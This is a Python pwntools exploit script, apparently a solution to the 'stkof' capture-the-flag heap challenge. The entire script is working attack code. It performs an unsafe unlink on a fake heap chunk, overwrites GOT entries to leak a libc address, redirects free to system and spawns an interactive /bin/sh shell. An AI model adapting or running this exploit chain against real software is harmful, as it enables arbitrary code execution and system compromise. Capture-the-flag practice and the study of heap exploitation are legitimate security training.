from pwn import*
from LibcSearcher import*
elf=ELF('stkof')
p=process('./stkof')
context.log_level='debug'
prt=0x602150
def new(size):
    p.sendline(b'1')
    p.sendline(str(size).encode('latin'))
def edit(index,size,content):
    p.sendline(b'2')
    p.sendline(str(index).encode('latin'))
    p.sendline(str(size).encode('latin'))
    p.send(content)
def delete(index):
    p.sendline(b'3')
    p.sendline(str(index).encode('latin'))

new(0x10)
new(0x20)
new(0x80)
new(0x10)

payload=p64(0)+p64(0x20)+p64(prt-0x18)+p64(prt-0x10)+p64(0x20)+b'\x90'
edit(2,len(payload),payload)
delete(3)

payload=b'\x00'*0x10+p64(prt+0x10)+p64(elf.got['free'])+p64(elf.got['atoi'])
edit(2,len(payload),payload)
edit(2,len(p64(elf.plt['puts'])),p64(elf.plt['puts']))
delete(3)
atoi_addr=u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
print(hex(atoi_addr))

libc=LibcSearcher('atoi',atoi_addr)
libcbase=atoi_addr-libc.dump('atoi')
sys_addr=libcbase+libc.dump('system')
bin_sh=libcbase+libc.dump('str_bin_sh')
edit(2,len(p64(sys_addr)),p64(sys_addr))
edit(1,len(p64(bin_sh)),p64(bin_sh))
delete(4)

p.interactive()
